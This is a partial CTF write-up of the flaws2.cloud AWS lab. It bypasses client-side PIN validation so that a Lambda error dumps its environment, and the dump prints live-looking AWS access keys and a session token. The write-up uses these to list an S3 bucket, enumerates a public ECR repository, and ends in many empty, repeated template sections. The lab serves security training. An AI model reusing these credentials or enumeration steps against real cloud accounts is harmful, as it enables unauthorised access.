---
title: Lab - CTF：Flaw2.cloud [Level 1 - Level 6]
date: 2021-01-24 11:11:11 -0400
categories: [Lab, CTF]
tags: [Lab, CTF]
---

[toc]

---


# CTF：Flaw2

---

![Screen Shot 2021-01-24 at 23.39.21](https://i.imgur.com/xUVvhHa.png)

---


# Attacker


---


## Level 1 - sourse code api input error

> http://level1.flaws2.cloud/

<font color=red>

For this level, you'll need to enter the correct PIN code. The correct PIN is 100 digits long, so brute forcing it won't help.

</font>

```bash
aws s3 ls s3://level1.flaws2.cloud/
# An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied

aws s3 ls s3://level1.flaws2.cloud/ \
    --profile default
# An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
```


1. give the wrong code

```bash
# code: 1234
http://level1.flaws2.cloud/index.htm?incorrect
# The input validation is only done by the javascript. Get around it and pass a pin code that isn't a number.
```

2. source code

```html
<body>
    <div class="content">
        <div class="row">
            <div class="col-sm-12">
                <center><h1>Level 1</h1></center>

                <script type="text/javascript">
                    function validateForm() {
                        var code = document.forms["myForm"]["code"].value;
                        if (! ( !isNaN(parseFloat(code)) && isFinite(code)) ) {
                            alert("Code must be a number");
                            return false;
                        }
                    }
                </script>

                <form name="myForm" action="https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1" onsubmit="return validateForm()">
                    Code:
                    <input type="text" name="code" value="1234">
                    <input type="submit" value="Submit">
                </form>
            </div>
        </div>
    </div>

    <script type="text/javascript">
    if (window.location.search.substring(1).includes("incorrect")) {
        document.getElementById("incorrect").innerHTML = "<b style='background-color:#ffbabf; border-radius:3px; border: 2px solid #adadad; padding:5px;'>Incorrect. Try again.</b>";
    }
    </script>

</body>
</html>

<!-- the form submitting a request to https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=1234 -->

<!-- change the parameter https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=a -->
<!-- https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?a=a -->

Error, malformed input
{
    "PATH":"/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin",
    "LD_LIBRARY_PATH":"/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib",
    "LANG":"en_US.UTF-8","TZ":":UTC",
    "_HANDLER":"index.handler",
    "LAMBDA_TASK_ROOT":"/var/task",
    "LAMBDA_RUNTIME_DIR":"/var/runtime",
    "AWS_REGION":"us-east-1",
    "AWS_DEFAULT_REGION":"us-east-1",
    "AWS_LAMBDA_LOG_GROUP_NAME":"/aws/lambda/level1",
    "AWS_LAMBDA_LOG_STREAM_NAME":"2021/01/25/[$LATEST]8a9f5ac2839044cb8a620bcb9cb70ed1",
    "AWS_LAMBDA_FUNCTION_NAME":"level1",
    "AWS_LAMBDA_FUNCTION_MEMORY_SIZE":"128",
    "AWS_LAMBDA_FUNCTION_VERSION":"$LATEST",
    "_AWS_XRAY_DAEMON_ADDRESS":"169.254.79.2",
    "_AWS_XRAY_DAEMON_PORT":"2000",
    "AWS_XRAY_DAEMON_ADDRESS":"169.254.79.2:2000",
    "AWS_XRAY_CONTEXT_MISSING":"LOG_ERROR",
    "_X_AMZN_TRACE_ID":"Root=1-600e5095-29b6c96c385001134d332a25;Parent=4e64534f4cbdf814;Sampled=0",
    "AWS_EXECUTION_ENV":"AWS_Lambda_nodejs8.10",
    "AWS_LAMBDA_INITIALIZATION_TYPE":"on-demand",
    "NODE_PATH":"/opt/nodejs/node8/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules:/var/runtime:/var/task:/var/runtime/node_modules",
    "AWS_ACCESS_KEY_ID":"ASIAZQNB3KHGLQSH6RPB",
    "AWS_SECRET_ACCESS_KEY":"XBoluydzntRIvy3tTsx9cwtRvj3V5S3GF2Yfk/9H",
    "AWS_SESSION_TOKEN":"IQoJb3JpZ2luX2VjECUaCXVzLWVhc3QtMSJIMEYCIQDeH9bk+T4K74vLhq9t9Bp/ZElXGHasqm//WZR8CJ4FgQIhAOpm/YFJUp3uBk/w7PiqB/jKn0LnvqJtYbe7tuNQXBRFKs4BCP7//////////wEQAhoMNjUzNzExMzMxNzg4IgxAfFS8tmD/Z4aDHYUqogGAk5JP4FzYHwWkutkSjDv/vyxu8XkDIvEJzhlwljOCbu8sZ9YUNGzvqDZek1SfhRs1JJLw5t3NsXlF2C6ToGK+VgpS5QHloYCog8zHZ2kJxtldlHHaDEmPN7CMHuXdNfbEE2NJyeDt+vgrtIj5BtvdgUd+dk3vs94dQCISEdwER+XEHTz7xoKG5QiVTk/xA3UX2Pgo+4HdFllWQvtddcEDl94w2pq5gAY63wGMMv9zuRaJ2tKZ9cEY7gjJNJDrUrw25N9dgXAON9T77mGNEcLr4yN93A4Udh6LUzRAMKWZHpU1gwpUBPeFTTyMy+4dzU7evgCjF8tPtUUaGkCTi+NbZ7Zjl1hgcuSmutFr2C5o/a8uJGW+w8Sapl+sTctrTgwb5mWuYk/BjYz9JB8WP/m0NwDLEFqtmu3lFCbZXfl76udDkZWl6hMV/EesPYqtGc5Z6y59RWdj4lro8x6lY+7o5dYKRWqVUknqRg6pXC4uPcRUi554+Z8YGthClpb03rd1oMTneJkxXXcT"
}
```

3. configure the aws credential

```bash
$ aws s3 ls s3://level1.flaws2.cloud/ --profile flaws2
#                            PRE img/
# 2018-11-20 15:55:05      17102 favicon.ico
# 2018-11-20 21:00:22       1905 hint1.htm
# 2018-11-20 21:00:22       2226 hint2.htm
# 2018-11-20 21:00:22       2536 hint3.htm
# 2018-11-20 21:00:23       2460 hint4.htm
# 2018-11-20 21:00:17       3000 index.htm
# 2018-11-20 21:00:17       1899 secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html


http://level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
# The next level is at http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud
```


Lesson learned
---


Whereas EC2 instances obtain the credentials for their IAM roles from the metadata service at 169.254.169.254, AWS Lambda obtains those credentials from environmental variables.

1. Often developers will dump environmental variables when error conditions occur in order to help them debug problems.
   - dangerous as sensitive information can sometimes be found in environmental variables.

2. the IAM role had privilieges to list the contents of a bucket which wasn't needed for its operation.
   - Best practice: Least Privilege strategy

3. shouldn't rely on input validation to happen only on the client side or at some point upstream from your code.
   - AWS applications, especially serverless, are composed of many building blocks all chained together.
   - Developers sometimes assume that something upstream has already performed input validation. In this case, the client data was validated by Javascript which could be bypasseed, which then passed into API Gateway and finally to the Lambda.
   - Applications are often more complex than that, and these architectures can change over time, possibly breaking assumptions about where validation is supposed to occur.




---

## Level 1 -

> http://level1.flaws2.cloud/

<font color=red>

This next level is running as a container at http://container.target.flaws2.cloud/.

Just like S3 buckets, other resources on AWS can have open permissions.

I'll give you a hint that the ECR (Elastic Container Registry) is named "level2".

</font>

```bash
# If an ECR is public, list the images
aws ecr list-images \
    --repository-name REPO_NAME
    --registry-id ACCOUNT_ID

# get account id
aws sts get-caller-identity \
    --profile flaws2
# {
#     "UserId": "AROAIBATWWYQXZTTALNCE:level1",
#     "Account": "653711331788",
#     "Arn": "arn:aws:sts::653711331788:assumed-role/level1/level1"
# }


# All of flaws2 runs out of us-east-1. You can then list the images with:
aws ecr list-images \
    --repository-name level2 \
    --registry-id 653711331788
# {
#     "imageIds": [
#         {
#             "imageDigest": "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e",
#             "imageTag": "latest"
#         }
#     ]
# }

```

1. the image is public
   - two choices
   - download it locally with docker, pull and investigate it with Docker commands
   - or do things more manually with the AWS CLI.

```bash
# Option 1: Using the docker commands
# download it locally
aws ecr get-login
docker pull 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
docker inspect level2
You'll see the latest command with that, and to see previous commands use the Parent hash value with the same command, such as:

docker inspect sha256:079aee8a89950717cdccd15b8f17c80e9bc4421a855fcdc120e1c534e4c102e0
Option 2: Using the AWS CLI
If you want to dig into things without using Docker, you can use:

aws ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids imageTag=latest | jq '.images[].imageManifest | fromjson'
Then for a given digest, use:

aws ecr get-download-url-for-layer --repository-name level2 --registry-id 653711331788 --layer-digest "sha256:edfaad38ac10904ee76c81e343abf88f22e6cfc7413ab5a8e4aeffc6a7d9087a"
Next hint
```



Lesson learned
---


---


## Level 1 -

> http://level1.flaws2.cloud/

<font color=red>


</font>


Lesson learned
---


---

## Level 1 -

> http://level1.flaws2.cloud/

<font color=red>


</font>


Lesson learned
---


---

## Level 1 -

> http://level1.flaws2.cloud/

<font color=red>


</font>


Lesson learned
---


---

## Level 1 -

> http://level1.flaws2.cloud/

<font color=red>


</font>


Lesson learned
---


---

## Level 1 -

> http://level1.flaws2.cloud/

<font color=red>


</font>


Lesson learned
---


---

## Level 1 -

> http://level1.flaws2.cloud/

<font color=red>


</font>


Lesson learned
---


---

## Level 1 -

> http://level1.flaws2.cloud/

<font color=red>


</font>


Lesson learned
---


---

## Level 1 -

> http://level1.flaws2.cloud/

<font color=red>


</font>


Lesson learned
---


---

## Level 1 -

> http://level1.flaws2.cloud/

<font color=red>


</font>


Lesson learned
---


---

## Level 1 -

> http://level1.flaws2.cloud/

<font color=red>


</font>


Lesson learned
---


---

## Level 1 -

> http://level1.flaws2.cloud/

<font color=red>


</font>


Lesson learned
---


---

## Level 1 -

> http://level1.flaws2.cloud/

<font color=red>


</font>


Lesson learned
---


---

## Level 1 -

> http://level1.flaws2.cloud/

<font color=red>


</font>


Lesson learned
---


---

## Level 1 -

> http://level1.flaws2.cloud/

<font color=red>


</font>


Lesson learned
---


---

## Level 1 -

> http://level1.flaws2.cloud/

<font color=red>


</font>


Lesson learned
---


---
